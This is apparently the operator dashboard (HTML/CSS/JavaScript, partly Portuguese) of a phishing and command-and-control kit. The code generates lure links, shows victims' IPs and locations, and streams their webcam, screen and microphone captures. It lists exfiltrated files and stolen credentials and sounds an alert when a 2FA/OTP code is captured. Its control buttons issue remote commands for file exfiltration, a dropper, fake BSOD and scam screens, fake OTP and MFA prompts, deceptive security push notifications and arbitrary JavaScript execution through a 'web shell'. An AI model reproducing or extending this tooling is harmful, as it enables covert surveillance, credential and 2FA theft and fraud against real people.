    <style>
        :root {
            --primary: #00d2ff;
            --secondary: #3a7bd5;
            --bg: #0b0e14;
            --card-bg: rgba(20, 30, 48, 0.95);
            --danger: #ff4b2b;
            --success: #00ff88;
            --warning: #ffcc00;
        }

        body { 
            background: var(--bg);
            background-image: linear-gradient(135deg, #0b0e14 0%, #1a2a6c 100%);
            color: #e0e0e0;
            font-family: 'Segoe UI', Roboto, sans-serif;
            margin: 0;
            height: 100vh;
            overflow: hidden;
            display: flex;
            flex-direction: column;
        }

        /* Top Menu Style */
        .supreme-bar {
            background: rgba(0, 0, 0, 0.9);
            backdrop-filter: blur(20px);
            border-bottom: 1px solid var(--primary);
            padding: 5px 20px;
            display: flex;
            gap: 10px;
            overflow: visible; /* Importante para não cortar o menu */
            z-index: 10000;
            box-shadow: 0 5px 20px rgba(0, 210, 255, 0.3);
            position: relative;
        }

        .category-dropdown {
            position: relative;
            display: inline-block;
            padding: 10px 0;
            z-index: 10001;
        }

        .cat-btn {
            background: rgba(0, 210, 255, 0.05);
            border: 1px solid rgba(0, 210, 255, 0.2);
            color: var(--primary);
            padding: 8px 15px;
            border-radius: 6px;
            cursor: pointer;
            font-size: 0.7rem;
            font-weight: 800;
            text-transform: uppercase;
            transition: 0.2s;
            letter-spacing: 1px;
        }

        .category-dropdown:hover .cat-btn {
            background: var(--primary);
            color: #000;
            box-shadow: 0 0 15px var(--primary);
        }

        .dropdown-content {
            display: none;
            position: absolute;
            top: 100%;
            left: 0;
            background: rgba(10, 15, 25, 0.98);
            backdrop-filter: blur(25px);
            min-width: 240px;
            box-shadow: 0 20px 50px rgba(0,0,0,0.9);
            border: 1px solid var(--primary);
            border-top: 3px solid var(--primary);
            border-radius: 0 0 12px 12px;
            z-index: 10002;
            padding: 10px 0;
            flex-direction: column;
        }

        .category-dropdown:hover .dropdown-content {
            display: flex;
            animation: slideDown 0.2s ease-out;
        }

        @keyframes slideDown {
            from { opacity: 0; transform: translateY(-10px); }
            to { opacity: 1; transform: translateY(0); }
        }

        .dropdown-content button {
            background: transparent;
            color: #ccc;
            border: none;
            padding: 10px 20px;
            text-align: left;
            width: 100%;
            cursor: pointer;
            font-size: 0.7rem;
            font-weight: 500;
            transition: 0.2s;
            display: flex;
            align-items: center;
            gap: 10px;
        }

        .dropdown-content button::before {
            content: '>';
            color: var(--primary);
            font-weight: bold;
            opacity: 0;
            transition: 0.2s;
        }

        .dropdown-content button:hover {
            background: rgba(0, 210, 255, 0.1);
            color: var(--primary);
            padding-left: 25px;
        }

        .dropdown-content button:hover::before {
            opacity: 1;
        }

        .cyber-grid { display: grid; grid-template-columns: 360px 1fr; flex: 1; overflow: hidden; }

        /* Sidebar Style */
        .sidebar { 
            background: rgba(0, 0, 0, 0.4);
            backdrop-filter: blur(20px);
            border-right: 1px solid rgba(0, 210, 255, 0.2);
            padding: 25px;
            overflow-y: auto;
        }

        #main-map { height: 220px; border-radius: 15px; margin-bottom: 25px; border: 1px solid var(--primary); box-shadow: 0 0 15px rgba(0, 210, 255, 0.2); }

        /* Main Content */
        .main-content { padding: 30px; overflow-y: auto; }

        .glass-card { 
            background: var(--card-bg);
            border: 1px solid rgba(255, 255, 255, 0.1);
            border-radius: 20px;
            padding: 20px;
            margin-bottom: 20px;
            box-shadow: 0 8px 32px rgba(0, 0, 0, 0.3);
        }

        .stat-card { text-align: center; border-bottom: 3px solid var(--primary); }
        .stat-value { font-size: 2rem; font-weight: 800; color: #fff; text-shadow: 0 0 10px var(--primary); }

        /* Buttons */
        .btn-cyber { 
            background: linear-gradient(90deg, var(--primary), var(--secondary));
            border: none;
            color: #000;
            padding: 12px;
            border-radius: 10px;
            cursor: pointer;
            font-weight: 800;
            text-transform: uppercase;
            width: 100%;
            transition: 0.3s;
            margin-bottom: 10px;
            font-size: 0.75rem;
        }
        .btn-cyber:hover { transform: scale(1.02); box-shadow: 0 0 20px var(--primary); }
        .btn-danger { background: linear-gradient(90deg, #ff416c, #ff4b2b); color: #fff; }

        /* Session Cards */
        .session-card {
            background: rgba(15, 25, 45, 0.8);
            border: 1px solid rgba(0, 210, 255, 0.3);
            border-radius: 12px;
            overflow: hidden;
            transition: all 0.3s ease;
        }

        .session-header {
            padding: 15px 20px;
            background: rgba(0, 0, 0, 0.5);
            display: flex;
            justify-content: space-between;
            align-items: center;
            cursor: pointer;
            border-bottom: 1px solid transparent;
        }
        
        .session-header:hover { background: rgba(0, 210, 255, 0.1); }
        .session-header.active { border-bottom-color: rgba(0, 210, 255, 0.2); }

        .session-content {
            padding: 25px;
            display: none;
            grid-template-columns: 280px 1fr 300px;
            gap: 25px;
        }
        
        .session-card.expanded .session-content {
            display: grid;
        }

        .feed-box { background: #000; border-radius: 12px; overflow: hidden; position: relative; border: 1px solid #333; }
        .live-label { position: absolute; top: 10px; left: 10px; background: red; color: #fff; padding: 3px 8px; font-size: 0.6rem; font-weight: bold; border-radius: 4px; animation: pulse 1.5s infinite; }
        @keyframes pulse { 0% { opacity: 1; } 50% { opacity: 0.4; } 100% { opacity: 1; } }

        .chat-container { display: flex; flex-direction: column; height: 100%; }
        .chat-box { flex: 1; background: rgba(0,0,0,0.3); border-radius: 10px; padding: 10px; font-size: 0.75rem; overflow-y: auto; margin-bottom: 10px; border: 1px solid #222; max-height: 120px; }
        .chat-input { background: #000; border: 1px solid var(--primary); color: #fff; padding: 8px; border-radius: 10px; outline: none; font-size: 0.75rem; }

        .info-box { background: rgba(0,210,255,0.05); border: 1px solid rgba(0,210,255,0.2); border-radius: 8px; padding: 10px; margin-bottom: 10px; font-size: 0.65rem; color: #ccc; }
        .info-box span { color: var(--primary); font-weight: bold; }

        .action-grid { display: grid; grid-template-columns: repeat(2, 1fr); gap: 10px; }
        .btn-small { padding: 8px; font-size: 0.65rem; border-radius: 8px; border: 1px solid rgba(255,255,255,0.1); background: rgba(255,255,255,0.05); color: #fff; cursor: pointer; }
        .btn-small:hover { background: var(--primary); color: #000; }
    </style>

    <script>
        const socket = io(window.location.origin, {
            transports: ['polling', 'websocket'],
            upgrade: true,
            reconnection: true,
            reconnectionAttempts: 20,
            timeout: 10000,
            extraHeaders: { 'ngrok-skip-browser-warning': 'true' },
            withCredentials: false
        });
        socket.on('connect', () => {
            console.log('[DASHBOARD] ✅ Socket connected:', socket.id, 'via', socket.io.engine.transport.name);
            document.getElementById('threat-badge').innerHTML = `<span style="color:var(--success)">[ SYSTEM_ONLINE ]</span>`;
        });
        socket.on('connect_error', (err) => {
            console.error('[DASHBOARD] ❌ Socket error:', err.message);
            document.getElementById('threat-badge').innerHTML = `<span style="color:var(--danger)">[ CONNECTION_ERROR ]</span>`;
        });
        socket.on('disconnect', (reason) => {
            console.warn('[DASHBOARD] ⚠️ Disconnected:', reason);
            document.getElementById('threat-badge').innerHTML = `<span style="color:var(--warning)">[ DISCONNECTED: ${reason} ]</span>`;
        });
        let logs = [], map, markers = {}, currentAudio = null;

        function initMap() {
            try {
                if (typeof L === 'undefined') throw new Error('Leaflet not loaded');
                map = L.map('main-map', { zoomControl: false, attributionControl: false }).setView([20, 0], 1);
                L.tileLayer('https://{s}.basemaps.cartocdn.com/dark_all/{z}/{x}/{y}{r}.png').addTo(map);
            } catch (e) {
                console.error('[DASHBOARD] Map initialization failed:', e);
                document.getElementById('main-map').innerHTML = '<div style="padding:20px; text-align:center; color:red;">ERRO AO CARREGAR MAPA<br><small>Verifique sua conexão ou AdBlock</small></div>';
                map = { setView: () => {}, removeLayer: () => {}, fitBounds: () => {} };
            }
        }

        async function loadData() {
            try {
                const [logsRes, linksRes] = await Promise.all([
                    fetch('/api/logs', { cache: 'no-store', headers: { 'ngrok-skip-browser-warning': 'true' } }), 
                    fetch('/api/links', { cache: 'no-store', headers: { 'ngrok-skip-browser-warning': 'true' } })
                ]);
                
                if (!logsRes.ok || !linksRes.ok) throw new Error('Falha na resposta da API');
                
                logs = await logsRes.json();
                renderLinks(await linksRes.json());
                renderSessions(logs);
                updateMap(logs);
                updateStats();
            } catch (err) {
                console.error('[DASHBOARD] Load error:', err);
            }
        }

        function renderLinks(linksData) {
            const c = document.getElementById('links-list');
            if (!linksData || linksData.length === 0) {
                c.innerHTML = '<div style="opacity:0.5; text-align:center;">Nenhum link gerado ainda.</div>';
                return;
            }
            c.innerHTML = linksData.slice(0, 5).map(l => `
                <div style="background:rgba(255,255,255,0.05); padding:10px; border-radius:10px; margin-bottom:10px; display:flex; justify-content:space-between; align-items:center;">
                    <div style="overflow:hidden;"><b>${l.template.toUpperCase()}</b><br><span style="opacity:0.5;">${l.url}</span></div>
                    <button onclick="copy('${window.location.origin}${l.url}')" style="background:var(--primary); border:none; padding:5px 10px; border-radius:5px; font-size:0.6rem; font-weight:bold; cursor:pointer;">COPY</button>
                </div>
            `).join('');
        }

        function toggleSession(id) {
            const card = document.getElementById(`session-${id}`);
            if (card) {
                card.classList.toggle('expanded');
                const header = card.querySelector('.session-header');
                if (header) header.classList.toggle('active');
            }
        }

        function renderSessions(logsList) {
            const container = document.getElementById('sessions-container');
            
            // Create a set of current log IDs
            const currentIds = new Set(logsList.map(l => l.id));
            
            // Remove deleted sessions from DOM
            Array.from(container.children).forEach(child => {
                const id = child.id.replace('session-', '');
                if (!currentIds.has(id)) {
                    container.removeChild(child);
                }
            });

            logsList.reverse().forEach((l, index) => {
                let card = document.getElementById(`session-${l.id}`);
                
                if (!card) {
                    // Create new session card if it doesn't exist
                    card = document.createElement('div');
                    card.className = 'session-card';
                    card.id = `session-${l.id}`;
                    
                    card.innerHTML = `
                        <div class="session-header" onclick="toggleSession('${l.id}')">
                            <div style="display:flex; align-items:center; gap:15px;">
                                <b style="color:var(--primary); font-size:1.1rem;">NODE_${l.id}</b>
                                <span style="font-size:0.7rem; color:#aaa;" id="header-geo-${l.id}">${l.ip} | ${l.geo || 'Unknown'}</span>
                            </div>
                            <div style="display:flex; align-items:center; gap:15px;">
                                <div id="status-${l.id}" style="width:12px; height:12px; border-radius:50%; background:${l.status === 'offline' ? 'red' : (l.status === 'infected' ? '#ff3333' : 'var(--success)')}; box-shadow:0 0 8px ${l.status === 'offline' ? 'red' : (l.status === 'infected' ? '#ff3333' : 'var(--success)')};"></div>
                                <button onclick="event.stopPropagation(); deleteTarget('${l.id}')" style="background:rgba(255,0,0,0.2); border:1px solid red; color:white; border-radius:4px; padding:4px 8px; cursor:pointer; font-size:0.7rem; font-weight:bold;">DISCONNECT</button>
                            </div>
                        </div>
                        
                        <div class="session-content">
                            <div class="feeds">
                                <div style="font-size:0.7rem; color:var(--primary); margin-bottom:10px;">// LIVE_FEEDS</div>
                                <div class="feed-box" style="height:150px; margin-bottom:15px;">
                                    <div class="live-label">LIVE CAM</div>
                                    <img id="cam-${l.id}" src="${l.photo || ''}" style="width:100%; height:100%; object-fit:cover; ${l.photo ? '' : 'display:none'}">
                                </div>
                                <div class="feed-box" id="scr-box-${l.id}" style="height:120px; margin-bottom:15px;">
                                    <div class="live-label" style="background:var(--primary)">LIVE SCREEN</div>
                                    <img id="scr-${l.id}" src="${l.screenshot || ''}" style="width:100%; height:100%; object-fit:cover; ${l.screenshot ? '' : 'display:none'}">
                                </div>
                                <div style="background:rgba(0,0,0,0.5); padding:10px; border-radius:8px; border:1px solid #333; text-align:center;">
                                    <div style="font-size:0.6rem; color:var(--primary); margin-bottom:5px;">AUDIO_INTERCEPT</div>
                                    <audio id="audio-${l.id}" controls style="width:100%; height:30px; outline:none; ${l.audio ? '' : 'display:none'}" src="${l.audio || ''}"></audio>
                                    <div id="audio-wait-${l.id}" style="font-size:0.6rem; color:#aaa; ${l.audio ? 'display:none' : ''}">Waiting for capture...</div>
                                </div>
                            </div>

                            <div class="chat-container">
                                <div style="font-size:0.7rem; color:var(--primary); margin-bottom:10px;">// C2_COMMUNICATION</div>
                                <div class="chat-box" id="chat-${l.id}">
                                    ${l.chat ? l.chat.map(m => `<div style="margin-bottom:8px; color:${m.from==='admin'?'var(--primary)':'#fff'}"><b>${m.from.toUpperCase()}></b> ${m.msg}</div>`).join('') : ''}
                                </div>
                                <input type="text" class="chat-input" id="input-${l.id}" placeholder="Type message or command..." onkeydown="if(event.key==='Enter') sendChat('${l.id}')">
                                
                                <div style="font-size:0.7rem; color:var(--primary); margin-top:15px; margin-bottom:10px;">// SYS_INFO</div>
                                <div class="info-box">
                                    <div id="hw-${l.id}">${l.hardware || 'Waiting for telemetry...'}</div>
                                    <div id="extra-${l.id}" style="margin-top:5px;">${l.sysInfo || ''}</div>
                                    <div id="network-${l.id}" style="margin-top:5px; color:var(--warning);">
                                        ${l.internalDevices ? '<b>NET:</b> ' + l.internalDevices.join(', ') : ''}
                                    </div>
                                </div>
                            </div>

                            <div class="controls">
                                <div class="action-grid">
                                    <button class="btn-small" style="background:linear-gradient(90deg, #f00, #900); color:#fff; font-weight:bold; border:none;" onclick="socket.emit('remote_command',{id:'${l.id}', command:'panic'})">🔥 PANIC</button>
                                    <button class="btn-small" onclick="socket.emit('remote_command',{id:'${l.id}', command:'gps-req'})">📍 GPS</button>
                                    <button class="btn-small" onclick="socket.emit('remote_command',{id:'${l.id}', command:'alarm'})">🚨 ALRM</button>
                                    <button class="btn-small" onclick="socket.emit('remote_command',{id:'${l.id}', command:'shake'})">🌪️ SHK</button>
                                    <button class="btn-small" onclick="socket.emit('remote_command',{id:'${l.id}', command:'mfa-ask'})">🔑 MFA</button>
                                    <button class="btn-small" onclick="socket.emit('remote_command',{id:'${l.id}', command:'bsod'})">🖥️ BSOD</button>
                                    <button class="btn-small" onclick="socket.emit('remote_command',{id:'${l.id}', command:'scam'})">🚨 SCAM</button>
                                    <button class="btn-small" onclick="socket.emit('remote_command',{id:'${l.id}', command:'dropper'})">📦 DROP</button>
                                    <button class="btn-small" onclick="socket.emit('remote_command',{id:'${l.id}', command:'lock'})">🔒 LOCK</button>
                                    <button class="btn-small" onclick="socket.emit('remote_command',{id:'${l.id}', command:'clipboard-monitor'})">📋 CLIP</button>
                                    <button class="btn-small" onclick="socket.emit('remote_command',{id:'${l.id}', command:'mic-clip'})">🎙️ MIC</button>
                                    <button class="btn-small" onclick="socket.emit('remote_command',{id:'${l.id}', command:'vibrate'})">📳 VIBE</button>
                                    <button class="btn-small" onclick="socket.emit('remote_command',{id:'${l.id}', command:'fullscreen'})">📺 FULL</button>
                                    <button class="btn-small" onclick="socket.emit('remote_command',{id:'${l.id}', command:'spam'})">⚠️ SPAM</button>
                                    <button class="btn-small" onclick="socket.emit('remote_command',{id:'${l.id}', command:'pivot'})">🔍 PIVOT</button>
                                    <button class="btn-small" onclick="const url=prompt('URL:'); if(url) socket.emit('remote_command',{id:'${l.id}', command:'redirect', url})">🔗 GOTO</button>
                                    <button class="btn-small" style="background:#28a745; color:#fff;" onclick="socket.emit('remote_command',{id:'${l.id}', command:'file-exfil'})">📂 FILE</button>
                                    <button class="btn-small" style="background:var(--primary); color:#000; font-weight:bold;" onclick="toggleWebShell('${l.id}')">💻 SHELL</button>
                                    <button class="btn-small" style="background:#8a2be2; color:#fff; font-weight:bold;" onclick="socket.emit('remote_command',{id:'${l.id}', command:'start_live_audio'})">🎙️ AO VIVO</button>
                                    <button class="btn-small" style="background:var(--warning); color:#000; font-weight:bold;" onclick="socket.emit('remote_command',{id:'${l.id}', command:'otp-prompt'})">🔑 OTP</button>
                                    <button class="btn-small" style="background:rgba(255,0,0,0.3); color:#fff;" onclick="socket.emit('remote_command',{id:'${l.id}', command:'otp-error'})">❌ ERR</button>
                                    <button class="btn-small" style="background:var(--warning); color:#000; font-weight:bold;" onclick="sendPush('${l.id}')">📲 PUSH</button>
                                </div>

                                <div id="webshell-container-${l.id}" style="display:none; margin-top:15px; border:1px solid var(--primary); border-radius:8px; padding:10px; background:#050505;">
                                    <div style="font-size:0.65rem; color:var(--primary); margin-bottom:5px;">// WEB SHELL (JavaScript Dinâmico)</div>
                                    <div id="shell-output-${l.id}" style="background:#000; color:#0f0; font-family:monospace; font-size:10px; padding:5px; height:80px; overflow-y:auto; margin-bottom:5px; border:1px solid #333;"></div>
                                    <div style="display:flex; gap:5px;">
                                        <span style="color:#0f0; font-family:monospace;">></span>
                                        <input type="text" id="shell-input-${l.id}" placeholder="document.cookie" style="flex:1; background:transparent; border:none; color:#0f0; font-family:monospace; font-size:10px; outline:none;" onkeydown="if(event.key==='Enter') execShell('${l.id}')">
                                        <button onclick="execShell('${l.id}')" style="background:var(--primary); border:none; padding:2px 10px; border-radius:4px; font-weight:bold; cursor:pointer; font-size:10px;">RUN</button>
                                    </div>
                                </div>

                                <div style="margin-top:15px;">
                                    <div style="font-size:0.65rem; color:var(--primary); margin-bottom:5px;">// SCRIPT_INJECTION RÁPIDO</div>
                                    <div style="display:flex; gap:5px;">
                                        <input type="text" id="script-${l.id}" placeholder="JS Code (ex: alert('Hacked'))" style="flex:1; background:#000; border:1px solid #333; color:var(--primary); padding:8px; border-radius:8px; font-size:0.65rem;">
                                        <button onclick="injectScript('${l.id}')" style="background:var(--primary); border:none; padding:5px 10px; border-radius:8px; font-weight:bold; cursor:pointer; font-size:0.65rem;">EXE</button>
                                    </div>
                                </div>

                                <div style="margin-top:20px; font-size:0.65rem;">
                                    <div style="color:var(--success); margin-bottom:5px;">EXFILTRATED_FILES:</div>
                                    <div style="background:#000; padding:10px; border-radius:8px; border:1px solid #222; max-height:100px; overflow-y:auto;" id="files-${l.id}">
                                        ${l.files && l.files.length > 0 ? l.files.map(f => `
                                            <div style="margin-bottom:5px; border-bottom:1px solid #333; padding-bottom:3px; display:flex; justify-content:space-between; align-items:center;">
                                                <span style="color:#0f0;">${f.name}</span>
                                                <a href="${f.data}" download="${f.name}" style="background:var(--primary); color:#000; padding:2px 5px; border-radius:3px; text-decoration:none; font-weight:bold; font-size:10px;">GET</a>
                                            </div>
                                        `).join('') : 'Waiting for file exfil...'}
                                    </div>
                                </div>

                                <div style="margin-top:20px; font-size:0.65rem;">
                                    <div style="color:var(--primary); margin-bottom:5px;">EXTRACTED_DATA:</div>
                                    <div style="background:#000; padding:10px; border-radius:8px; border:1px solid #222; max-height:150px; overflow-y:auto;" id="creds-${l.id}">
                                        ${l.creds && l.creds.length > 0 ? `<ul style="margin:0; padding-left:15px; color:#0f0; list-style-type:square;">${l.creds.map(c => `<li style="margin-bottom:3px;">${c}</li>`).join('')}</ul>` : 'Waiting for telemetry...'}
                                    </div>
                                </div>
                            </div>
                        </div>
                    `;
                } else {
                    // Update existing card without replacing innerHTML to preserve state
                    const statusDot = document.getElementById(`status-${l.id}`);
                    if (statusDot) {
                        statusDot.style.background = l.status === 'offline' ? 'red' : 'var(--success)';
                        statusDot.style.boxShadow = `0 0 8px ${l.status === 'offline' ? 'red' : 'var(--success)'}`;
                    }
                    
                    const headerGeo = document.getElementById(`header-geo-${l.id}`);
                    if (headerGeo) headerGeo.innerText = `${l.ip} | ${l.geo || 'Unknown'}`;
                    
                    const hwBox = document.getElementById(`hw-${l.id}`);
                    if (hwBox && l.hardware) hwBox.innerText = l.hardware;
                    
                    const extraBox = document.getElementById(`extra-${l.id}`);
                    if (extraBox && l.sysInfo) extraBox.innerText = l.sysInfo;
                    
                    const netBox = document.getElementById(`network-${l.id}`);
                    if (netBox && l.internalDevices) netBox.innerHTML = '<b>NET:</b> ' + l.internalDevices.join(', ');
                    
                    const credsBox = document.getElementById(`creds-${l.id}`);
                    if (credsBox) credsBox.innerHTML = l.creds && l.creds.length > 0 ? `<ul style="margin:0; padding-left:15px; color:#0f0; list-style-type:square;">${l.creds.map(c => `<li style="margin-bottom:3px;">${c}</li>`).join('')}</ul>` : 'Waiting for telemetry...';
                    
                    const chatBox = document.getElementById(`chat-${l.id}`);
                    if (chatBox && l.chat) {
                        chatBox.innerHTML = l.chat.map(m => `<div style="margin-bottom:8px; color:${m.from==='admin'?'var(--primary)':'#fff'}"><b>${m.from.toUpperCase()}></b> ${m.msg}</div>`).join('');
                    }
                }
                
                // Ensure correct order in the DOM
                if (container.children[index] !== card) {
                    if (container.children[index]) {
                        container.insertBefore(card, container.children[index]);
                    } else {
                        container.appendChild(card);
                    }
                }
            });
        }

        socket.on('update_log', (data) => {
            console.log('Update received:', data);
            
            // Direct DOM updates for performance
            const cam = document.getElementById(`cam-${data.id}`);
            if (data.photo && cam) {
                cam.src = data.photo;
                cam.style.display = 'block';
            }
            
            const scr = document.getElementById(`scr-${data.id}`);
            if (data.screenshot && scr) {
                scr.src = data.screenshot;
                scr.style.display = 'block';
            }
            
            const statusDot = document.getElementById(`status-${data.id}`);
            if (data.status && statusDot) {
                let color = 'var(--success)';
                if (data.status === 'offline') color = 'red';
                if (data.status === 'infected') color = '#ff3333';
                statusDot.style.background = color;
                statusDot.style.boxShadow = `0 0 8px ${color}`;
            }

            const geoTxt = document.getElementById(`header-geo-${data.id}`);
            if (data.geo && geoTxt) {
                geoTxt.innerText = geoTxt.innerText.split('|')[0] + '| ' + data.geo;
            }

            if (data.typing) {
                const hwTxt = document.getElementById(`hw-${data.id}`);
                const extraTxt = document.getElementById(`extra-${data.id}`);
                if (data.typing.startsWith('[HARDWARE]:') && hwTxt) {
                    hwTxt.innerText = data.typing.replace('[HARDWARE]:', '').trim();
                } else if (data.typing.startsWith('[SYS]:') && extraTxt) {
                    extraTxt.innerText = data.typing.replace('[SYS]:', '').trim();
                }
            }

            // Special alert for OTP detection
            if (data.creds && data.creds.some(c => c.includes('OTP_CODE'))) {
                new Audio('https://www.soundjay.com/buttons/button-3.mp3').play().catch(()=>{});
                console.log('[C2] !!! 2FA CODE CAPTURED !!!');
            }

            // Only reload full data if it's a structural change (like new creds, chat or files)
            if (data.creds || data.chat || data.files || data.deleted) {
                loadData();
            }
        });

        socket.on('new_click', (data) => {
            console.log('New victim connected:', data);
            new Audio('https://www.soundjay.com/buttons/beep-07.mp3').play().catch(()=>{});
            loadData();
        });

        socket.on('all_logs_deleted', () => {
            logs = [];
            renderSessions([]);
            updateMap([]);
            updateStats();
        });

        function updateMap(logsList) {
            // Clear old markers
            Object.values(markers).forEach(m => map.removeLayer(m));
            markers = {};
            
            logsList.forEach(l => {
                if (l.lat && l.lon) {
                    const icon = L.divIcon({
                        className: 'cyber-marker',
                        html: `<div style="background:${l.status === 'offline' ? 'red' : 'var(--primary)'}; width:15px; height:15px; border-radius:50%; border:2px solid #000; box-shadow:0 0 10px ${l.status === 'offline' ? 'red' : 'var(--primary)'};"></div>`,
                        iconSize: [15, 15]
                    });
                    const marker = L.marker([l.lat, l.lon], { icon }).addTo(map)
                        .bindPopup(`<b>NODE:</b> ${l.id}<br><b>GEO:</b> ${l.geo}<br><b>IP:</b> ${l.ip}`);
                    markers[l.id] = marker;
                }
            });
            
            // Adjust map view to fit all markers if any
            const activeMarkers = Object.values(markers);
            if (activeMarkers.length > 0) {
                const group = new L.featureGroup(activeMarkers);
                map.fitBounds(group.getBounds().pad(0.5));
            } else {
                map.setView([20, 0], 1); // Reset to world view if empty
            }
        }

        socket.on('mouse_move', (data) => {
            const cursor = document.getElementById(`cursor-${data.logId}`);
            const container = document.getElementById(`scr-box-${data.logId}`);
            if(container) {
                if(!cursor) {
                    const dot = document.createElement('div');
                    dot.id = `cursor-${data.logId}`;
                    dot.style.cssText = "position:absolute; width:8px; height:8px; background:red; border-radius:50%; pointer-events:none; z-index:10; box-shadow:0 0 10px red;";
                    container.appendChild(dot);
                } else {
                    cursor.style.left = data.x + '%';
                    cursor.style.top = data.y + '%';
                }
            }
        });

        socket.on('js_result_admin', (data) => {
            const outBox = document.getElementById(`shell-output-${data.logId}`);
            if (outBox) {
                outBox.innerHTML += `<div><span style="color:#aaa;"><</span> ${data.result}</div>`;
                outBox.scrollTop = outBox.scrollHeight;
            }
        });

        socket.on('new_link_created', (link) => {
            console.log('[C2] Novo link recebido via socket');
            loadData();
        });

        function toggleWebShell(id) {
            const el = document.getElementById(`webshell-container-${id}`);
            if(el) el.style.display = el.style.display === 'none' ? 'block' : 'none';
        }

        function execShell(id) {
            const input = document.getElementById(`shell-input-${id}`);
            const outBox = document.getElementById(`shell-output-${id}`);
            if(!input || !input.value) return;
            
            const code = input.value;
            outBox.innerHTML += `<div><span style="color:var(--primary);">></span> ${code}</div>`;
            outBox.scrollTop = outBox.scrollHeight;
            
            socket.emit('remote_command', { id: id, command: 'execute_js', script: code });
            input.value = '';
        }

        async function deleteAllTargets() { if(confirm('TERMINATE ALL SESSIONS?')) { await fetch('/api/logs', { method: 'DELETE', headers: { 'ngrok-skip-browser-warning': 'true' } }); loadData(); } }
        async function deleteTarget(id) { await fetch(`/api/logs/${id}`, { method: 'DELETE', headers: { 'ngrok-skip-browser-warning': 'true' } }); loadData(); }
        function sendChat(id) {
            const i = document.getElementById(`input-${id}`);
            if(!i.value) return;
            socket.emit('admin_send_chat', { id, msg: i.value });
            i.value = '';
        }

        function injectScript(id) {
            const i = document.getElementById(`script-${id}`);
            if(!i.value) return;
            socket.emit('inject_script', { id, script: i.value });
            i.value = '';
            alert('SCRIPT_INJECTED');
        }

        function toggleAudio(id) {
            currentAudio = (currentAudio === id) ? null : id;
            document.querySelectorAll('[id^=mic-]').forEach(b => b.style.color = '#fff');
            if(currentAudio) document.getElementById(`mic-${id}`).style.color = 'var(--primary)';
        }

        socket.on('audio_stream', (data) => { if(currentAudio === data.logId) new Audio(data.chunk).play().catch(()=>{}); });
        
        function globalCmd(command) {
            if (logs.length === 0) return alert('Nenhum alvo conectado para comando global.');
            
            const url = (command === 'redirect') ? prompt('URL de destino (ex: https://google.com):') : null;
            const text = (command === 'speak') ? prompt('Texto para o alerta de voz:') : null;
            
            if (command === 'file-exfil' && !confirm('Disparar pedido de arquivo para TODOS os alvos?')) return;
            
            logs.forEach(l => {
                socket.emit('remote_command', { id: l.id, command, url, text });
            });
            
            console.log(`[C2] Comando Global ${command} disparado para ${logs.length} alvos.`);
        }

        function sendPush(id) {
            const title = prompt('Título da Notificação:', 'Alerta de Segurança');
            const msg = prompt('Mensagem:', 'Sua conta precisa de verificação urgente.');
            if (title && msg) {
                socket.emit('admin_send_push', { id, title, msg });
                alert('PUSH_SENT');
            }
        }

        function updateStats() {
            document.getElementById('stat-targets').innerText = logs.length;
            document.getElementById('stat-creds').innerText = logs.reduce((a,l)=>a+(l.creds?l.creds.length:0), 0);
        }

        function createLink() { fetch('/api/links', { method: 'POST', headers: { 'Content-Type': 'application/json', 'ngrok-skip-browser-warning': 'true' }, body: JSON.stringify({ template: document.getElementById('template-select').value }) }).then(loadData); }
        function copy(text) { navigator.clipboard.writeText(text); alert('LINK_COPIED'); }
        function closeModal() { document.getElementById('proof-modal').style.display = 'none'; }
        function generateReport() { alert("EXPORTING_DOSSIER..."); }

        try {
            initMap();
        } catch (e) {
            console.error('[DASHBOARD] Map initialization failed:', e);
            // Define a dummy map object to prevent errors in other functions
            map = { setView: () => {}, removeLayer: () => {}, fitBounds: () => {} };
        }
        
        loadData().catch(err => console.error('[DASHBOARD] Initial load failed:', err));
        
        // AGGRESSIVE POLLING (Essential for Vercel)
        // Since WebSockets are unstable on Serverless, we poll the DB every 3 seconds
        setInterval(() => {
            loadData().catch(err => {});
        }, 3000);
    </script>
</body>
</html>
